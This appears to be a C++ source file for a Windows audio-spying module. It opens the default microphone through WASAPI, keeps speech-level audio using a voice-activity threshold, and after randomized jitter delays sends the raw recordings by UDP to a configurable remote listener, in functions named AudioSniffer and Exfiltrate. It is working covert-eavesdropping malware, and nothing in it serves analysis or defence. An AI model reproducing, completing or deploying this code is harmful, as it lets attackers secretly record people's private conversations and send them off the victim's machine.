#include "audio.h"

void AudioManager::SetSleepMode(int modeInt) {
    // 1. Convert the int to our Enum
    SleepProfile profile = static_cast<SleepProfile>(modeInt);
    
    float min = 1;
    float max = 6;

    switch (modeInt) {
        case 0: min = 5.0f;  max = 10.0f; break; 
        case 1: min = 10.0f; max = 20.0f; break;
        case 2: min = 20.0f; max = 40.0f; break; 
        case 3: min = 40.0f; max = 80.0f; break;
        case 4: min = 1.0f;  max = 80.0f; break;
    }
    this->dist = std::uniform_real_distribution<float>{ min, max };
}

void AudioManager::RandomSleep() {
    float value = dist(gen);
    Sleep(static_cast<DWORD>(value * 1000));
}

void AudioManager::SetListener(std::string ip_address, int port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return;
    }

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr);

    socketInitialized = true;
}


bool AudioManager::Initialize() {
	HRESULT hrInit = CoInitialize(NULL);
	HRESULT hrCreate = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);

	if (FAILED(hrCreate)) {
		return false;
	}

	pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);

	pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
	// Set the audio format
	pAudioClient->GetMixFormat(&pwfx);
	pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);

	pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
	return true;
}

void AudioManager::Release() {
	pAudioClient->Stop();
	pAudioClient->Release();
	pCaptureClient->Release();
	pDevice->Release();
	pEnumerator->Release();
	CoUninitialize();
}

void AudioManager::LaunchSnifferThread() {
	sniffer = std::thread(&AudioManager::AudioSniffer, this);
}

void AudioManager::AudioSniffer() {
    pAudioClient->Start();

    while (bRunning) {
        UINT32 packetLength = 0;
        pCaptureClient->GetNextPacketSize(&packetLength);

        while (packetLength != 0) {
            BYTE* pData;
            UINT32 numFramesAvailable;
            DWORD flags;

            if (FAILED(pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL))) break;

            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
                float* fData = (float*)pData;
                UINT32 sampleCount = numFramesAvailable * pwfx->nChannels;

                float totalPower = 0.0f;
                std::vector<short> tempConverted;
                tempConverted.reserve(sampleCount); // Pre-allocate for speed

                // 1. Convert and calculate power in one pass
                for (UINT32 i = 0; i < sampleCount; i++) {
                    float sample = fData[i];

                    // Simple peak power check
                    totalPower += fabsf(sample);

                    if (sample > 1.0f) sample = 1.0f;
                    if (sample < -1.0f) sample = -1.0f;
                    tempConverted.push_back((short)(sample * 32767.0f));
                }

                float averagePower = totalPower / sampleCount;

                // 2. POWER THRESHOLD CHECK (VAD)
                // 0.005f is a good start for "voice," 0.001f for "room noise"
                if (averagePower > 0.002f) {
                    // 3. ONE SINGLE LOCK for the whole packet
                    std::lock_guard<std::mutex> lock(bufferMutex);
                    const char* rawBytes = reinterpret_cast<const char*>(tempConverted.data());
                    size_t byteSize = tempConverted.size() * sizeof(short);
                    globalAudioBuffer.insert(globalAudioBuffer.end(), rawBytes, rawBytes + byteSize);
                }
            }

            pCaptureClient->ReleaseBuffer(numFramesAvailable);
            pCaptureClient->GetNextPacketSize(&packetLength);
        }
        Sleep(1); // Small sleep to keep CPU usage down
    }
}



void AudioManager::Exfiltrate() {
    while (bRunning) {
        RandomSleep();
        std::cout << "[+] Done sleeping" << std::endl;
        std::vector<char> dataToProcess; 

        {
            std::unique_lock<std::mutex> lock(bufferMutex);

            // OPTIMIZATION: Only "drain" the siphon if we have enough data to be efficient
            // 64KB is a good 'full' packet size for raw audio
            if (globalAudioBuffer.size() < 8192 && bRunning) {
                lock.unlock(); // Explicitly unlock safely
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }

            dataToProcess.swap(globalAudioBuffer);
        }
        
        if (dataToProcess.empty()) {
            std::cout << "[+] Dataframe is empty!" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        if (socketInitialized) {
            const size_t MAX_UDP_SIZE = 8192;
            size_t offset = 0;

            while (offset < dataToProcess.size()) {
                size_t toSend = min(MAX_UDP_SIZE, dataToProcess.size() - offset);
                std::cout << "[+] Sending " << toSend << " bytes of data to listener" << std::endl;
                int result = sendto(udpSocket, dataToProcess.data() + offset, (int)toSend, 0,
                    (struct sockaddr*)&serverAddr, sizeof(serverAddr));

                if (result == SOCKET_ERROR) {
                    int err = WSAGetLastError();
                    if (err != 10054) std::cerr << "Socket Error: " << err << std::endl;
                }

                offset += toSend;
            }
        }
    }
}

void AudioManager::Stop() {
    bRunning = false;
    if (sniffer.joinable()) {
        sniffer.join();
    }
	Release();
}

void AudioManager::Start() {
    if (!bRunning) {
        bRunning = true;
    }
    LaunchSnifferThread();
    exfilThread = std::thread(&AudioManager::Exfiltrate, this);
    exfilThread.detach();
    Exfiltrate();
    Stop();
}